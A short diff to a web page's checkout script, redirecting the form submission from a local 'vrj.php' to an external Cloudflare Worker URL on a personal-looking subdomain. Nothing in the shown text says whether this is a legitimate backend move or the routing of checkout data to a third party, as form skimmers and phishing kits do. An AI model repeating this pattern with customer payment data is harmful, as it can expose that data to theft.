@@ -404,12 +404,12 @@
         // Initial total update
         updateTotal();
     });
-    function submitForm() {
+   function submitForm() {
     // Get form data
     var formData = new FormData(document.getElementById("checkout-form"));
 
-    // Send form data to server using fetch API
-    fetch('vrj.php', {
+    // Send form data to Cloudflare Worker endpoint
+    fetch('https://worker-blue-wind-1446.bashirmubarak08.workers.dev/', {
         method: 'POST',
         body: formData
     })
@@ -430,6 +430,7 @@
         alert('There was an error submitting the form.');
     });
 }
+
 </script>
 </body>
 </html>
